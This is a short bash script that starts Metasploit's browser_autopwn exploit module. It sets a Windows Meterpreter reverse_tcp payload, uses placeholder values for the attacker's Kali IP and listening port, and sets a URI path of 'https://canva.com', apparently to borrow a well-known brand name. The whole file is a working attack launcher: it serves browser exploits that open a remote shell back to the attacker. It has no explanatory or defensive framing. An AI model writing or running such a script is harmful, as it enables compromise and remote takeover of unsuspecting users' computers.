#!/bin/bash 
 
# Define variables 
LHOST="Kali_IP"           
LPORT="Listening_port"    
URIPATH="https://canva.com"   
PAYLOAD="windows/meterpreter/reverse_tcp"   
 
# Start Metasploit and load the browser_autopwn module 
msfconsole -q -x "use exploit/multi/browser/browser_autopwn; 
                set PAYLOAD $PAYLOAD; 
                set LHOST $LHOST;                              
                set LPORT $LPORT; 
                set URIPATH $URIPATH;                                 
                exploit -j"    
